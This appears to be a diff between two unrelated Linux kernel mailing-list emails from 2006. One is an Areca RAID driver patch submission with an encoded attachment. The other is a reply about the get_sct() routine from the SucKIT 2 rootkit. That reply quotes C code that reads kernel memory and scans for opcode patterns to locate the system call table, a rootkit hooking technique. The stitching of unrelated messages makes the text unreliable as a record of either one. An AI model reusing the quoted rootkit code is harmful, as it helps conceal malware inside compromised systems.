@@ -1,87 +1,103 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1751204AbWDFMLV@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1750962AbWDFMPb@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1751204AbWDFMLV (ORCPT <rfc822;willy@w.ods.org>);
-	Thu, 6 Apr 2006 08:11:21 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1750900AbWDFMLV
+	id S1750962AbWDFMPb (ORCPT <rfc822;willy@w.ods.org>);
+	Thu, 6 Apr 2006 08:15:31 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1751055AbWDFMPb
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Thu, 6 Apr 2006 08:11:21 -0400
-Received: from 220-130-178-143.HINET-IP.hinet.net ([220.130.178.143]:11771
-	"EHLO areca.com.tw") by vger.kernel.org with ESMTP id S1751204AbWDFMLU
-	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Thu, 6 Apr 2006 08:11:20 -0400
-Message-ID: <001901c65973$0bf933b0$b100a8c0@erich2003>
-From: "erich" <erich@areca.com.tw>
-To: "Linux Andrew Morton" <akpm@osdl.org>
-Cc: <oliver@neukum.org>, <akpm@osdl.org>, <alan@lxorguk.ukuu.org.uk>,
-       <billion.wu@areca.com.tw>, <linux-kernel@vger.kernel.org>,
-       <linux-scsi@vger.kernel.org>,
-       "\"\"\"Christoph Hellwig\"\"\"" <hch@infradead.org>,
-       "Chris Caputo" <ccaputo@alt.net>
-Subject: areca-raid-linux-scsi-driver-update5.patch for 2.6.17-rc1-mm1
-Date: Thu, 6 Apr 2006 20:10:05 +0800
+	Thu, 6 Apr 2006 08:15:31 -0400
+Received: from odyssey.analogic.com ([204.178.40.5]:12549 "EHLO
+	odyssey.analogic.com") by vger.kernel.org with ESMTP
+	id S1750900AbWDFMPa convert rfc822-to-8bit (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Thu, 6 Apr 2006 08:15:30 -0400
 MIME-Version: 1.0
-Content-Type: multipart/mixed;
-	boundary="----=_NextPart_000_0016_01C659B6.18986BC0"
-X-Priority: 3
-X-MSMail-Priority: Normal
-X-Mailer: Microsoft Outlook Express 6.00.3790.1830
-X-MimeOLE: Produced By Microsoft MimeOLE V6.00.3790.1830
-X-OriginalArrivalTime: 06 Apr 2006 12:06:15.0046 (UTC) FILETIME=[80E7DA60:01C65972]
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: 7BIT
+X-MimeOLE: Produced By Microsoft Exchange V6.5.7226.0
+in-reply-to: <6ff3e7140604051838k1b332990i488f373aad99fa71@mail.gmail.com>
+x-originalarrivaltime: 06 Apr 2006 12:15:25.0825 (UTC) FILETIME=[C9320F10:01C65973]
+Content-class: urn:content-classes:message
+Subject: Re: What means "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8"
+Date: Thu, 6 Apr 2006 08:15:25 -0400
+Message-ID: <Pine.LNX.4.61.0604060813380.8803@chaos.analogic.com>
+X-MS-Has-Attach: 
+X-MS-TNEF-Correlator: 
+Thread-Topic: What means "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8"
+Thread-Index: AcZZc8k5jHgvt+KpQR+4fXzKWcs/Ng==
+References: <6ff3e7140604051838k1b332990i488f373aad99fa71@mail.gmail.com>
+From: "linux-os \(Dick Johnson\)" <linux-os@analogic.com>
+To: "openbsd shen" <openbsd.shen@gmail.com>
+Cc: "kernel" <linux-kernel@vger.kernel.org>
+Reply-To: "linux-os \(Dick Johnson\)" <linux-os@analogic.com>
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-This is a multi-part message in MIME format.
 
-------=_NextPart_000_0016_01C659B6.18986BC0
-Content-Type: text/plain;
-	format=flowed;
-	charset="big5";
-	reply-type=original
-Content-Transfer-Encoding: 7bit
 
-From: Erich Chen <erich@areca.com.tw>
+In what file did you find this? This is how back-doors are written!
 
-  1- modify ARCMSR_MAX_XFER_SECTORS 4096 into 512
-  2- add new SAS RAID Adapter device id
+On Wed, 5 Apr 2006, openbsd shen wrote:
 
-Signed-off-by: Erich Chen <erich@areca.com.tw>
----
- drivers/scsi/arcmsr/arcmsr.h     |    2 
- drivers/scsi/arcmsr/arcmsr_hba.c |   80 ++++++++---------------------
- include/linux/pci_ids.h          |    4 +
- 3 files changed, 28 insertions(+), 58 deletions(-)
+> this code from get_sct() of suckit 2, why memmem()
+> "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8"use, what it want to find?
+> The get_sct() founction:
+>
+> ulong   get_sct()
+> {
+>        uchar   code[SCLEN+256];
+>        uchar   *p, *pt;
+>        ulong   r;
+>        uchar   pt_off, pt_bit;
+>        int     i;
+>
+>        kernel_old80 = get_ep();
+>
+>        if (!kernel_old80)
+>                return 0;
+>        if (rkm(code, sizeof(code), kernel_old80-4) <= 0)
+>                return 0;
+>
+>        if (!memcmp(code, "PUNK", 4))
+>                return 0;
+>
+>        p = (char *) memmem(code, SCLEN, "\xff\x14\x85", 3);
+>        if (!p) return 0;
+>
+>        pt = (char *) memmem(p+7, SCLEN-(p-code)-7,
+>                "\xc7\x44\x24\x18\xda\xff\xff\xff\xe8", 9);
+>        /* when run at here , it always return 0 */
+>        if (!pt) {
+>                eprintf("pt = %s\n", pt);
+>                return 0;
+>        }
+>
+>        sc.trace = *((ulong *) (pt + 9));
+>        sc.trace += kernel_old80 + (pt - code) - 4 + 9 + 4;
+>
+>        pt = (char *) memmem(p+7, SCLEN-(p-code)-7, "\xff\x14\x85", 3);
+>        if (!pt) return 0;
+>
+>        for (i = 0; i < (p-code); i++) {
+>                if ((code[i] == 0xf6) && (code[i+1] == 0x43) &&
+>                    (code[i+4] == 0x75) && (code[i+2] < 127)) {
+>                        pt_off = code[i+2];
+>                        pt_bit = code[i+3];
+>                        goto cc;
+>                }
+>        }
+>
+>        return 0;
+> }
+> -
 
-Best Regards
-Erich Chen
-------=_NextPart_000_0016_01C659B6.18986BC0
-Content-Type: application/x-compressed;
-	name="areca-raid-linux-scsi-driver-update5.patch.gz"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment;
-	filename="areca-raid-linux-scsi-driver-update5.patch.gz"
+Cheers,
+Dick Johnson
+Penguin : Linux version 2.6.15.4 on an i686 machine (5589.42 BogoMips).
+Warning : 98.36% of all statistics are fiction, book release in April.
+_
+
 
-H4sICId3NUQAA2FyZWNhLXJhaWQtbGludXgtc2NzaS1kcml2ZXItdXBkYXRlNS5wYXRjaADNWP9P
-o0gU/7n8FS9eLmkt08JQvti9NSJFl0TbBtDzkksIArVkKzWA6xrP//1mgFpra4fTvV0nKUOGz3vz
-Po/PvGF6lM6v+2CmcTAFYxol8EdE7w/8NAr8TjC/7uR3+xwHICK4nofx5B502zh1bO9Uv/Aujkzb
-c0zDHdkO9IQ9BeIkn4MsYmKBEfhhCEl0B47ugK1bA9BD/yaPUgijb3EQQRxynBNfJVGI5pMJurxn
-h4IQ4iBM429RmnWzIIu7fhpcZ2nVdaZA2z/0gmEb0pteEq8FUhOgXTW0qXGEVjC7DaPuLE5uv3dv
-gtiLw6yaazlhD9ocSDCJZ1EGwdRPrqKQB6wR8yxK83ieZM12iwdZIwmYReUAanGUFJSutzHrzNP4
-qoEFQUFCDwkKiFIf9/qy0BEWDciwIHCESA1/L10p/Z625urgAFBP41VoF9eDAw5+C6NJnETPhXBk
-m6ZhHHrDs9NG2bCmrSEHtnVOBEN+jjUaUtTOoIgPzkmMJBsgdjBl0xGlnTVrx3AszxparqUTvXnW
-oJpIljm0IaTn2iyR1auiOuXatSwahZI3QF3dPjbdRQgNENUtsJOz4QIH60mhOON04I1NuwI+fzI6
-cx1XHw6s4TFF1VJKqeyNapH7kvgmtZQ+X7jr4b6oblSMKEm8Am3aiQIRDWS5n8cB6dLbIAe6gMoS
-QNYRVDMUAxw0HsaG5Q3Mc8swm/T23BwOivft6bZp6Dwsnz8NeiJWhNYj/3Zz9X3mWmHefqO59F5z
-8T3myvtmV8rZSeoEHoRHHrq74EbpdZyQV55cQZTk6T3sdjl4/MTB6WhwdmIuvLj64YnZJHLgV1RA
-ZeHl/uUsan2q9CSrPC3ToqSIfA8/k1RAimhOq20Ku5WPOJnMm5XUHCqpG904hM+wGKt2IWNOIpvP
-Dmfz4CvstmA6z3K0T6+hn/sk1sZSo5+B+kD7N2QI7ZfjFJHdxXkwbT4BW/DAoUbgZ9HmZImi0CeQ
-NgOyFYAJ4IHM3WhkNynZcCfNy9sJT6Yl9bSA0AJC3VBzdEG2pfHIdh2yC7t6uQ0bo6Frj05OTBt2
-yFRPdgXiy8hxQR/oY5c8XofTeXf+ThYb3+9ZOcRvLvKtT8XTyzTyvxa3j9vTg9npwYz0iBILoLAA
-KusNsGLArBgwKwbMjEErUsWUAV7IQPvxMmjScQWZw2NraIKVZHEYtf43bUhMbZA6uj1ppFJuBygs
-D6Ta1Uq7tEi7iP9D3p0PmHalSDtiEVaeCCvbCaOaFNBWCmhJATEpqPUoqAsKmFEyfz4FLNaigKui
-b16MbdNxWKUfrdfyHxgyrhcyXg2ZUaZ+QeqlejykVR6sdf8LiNRbyVh5QeTDrWdcbz1jdZXIB1zV
-dLehn5kT/3aWs/aVC+T+NTZr7CMV8GdvJcuz6St/l2w8kop9GW85kr7i6oUXWe3Le5tPonuaXBxF
-aV+cRZcn8NdWSUP4TjsWUC2BKhOolUBNWP7t8NrnCwVKNYBiCRQZQKX0qDA9KqVH0nGwSmd5CHSw
-NYKVRizUUH6NPsV7f1rD53hZlUTuX8n0lLF1FAAA
+****************************************************************
+The information transmitted in this message is confidential and may be privileged.  Any review, retransmission, dissemination, or other use of this information by persons or entities other than the intended recipient is prohibited.  If you are not the intended recipient, please notify Analogic Corporation immediately - by replying to this message or by sending an email to DeliveryErrors@analogic.com - and destroy all copies of this information, including any attachments, without reading or disclosing them.
 
-------=_NextPart_000_0016_01C659B6.18986BC0--
-
+Thank you.
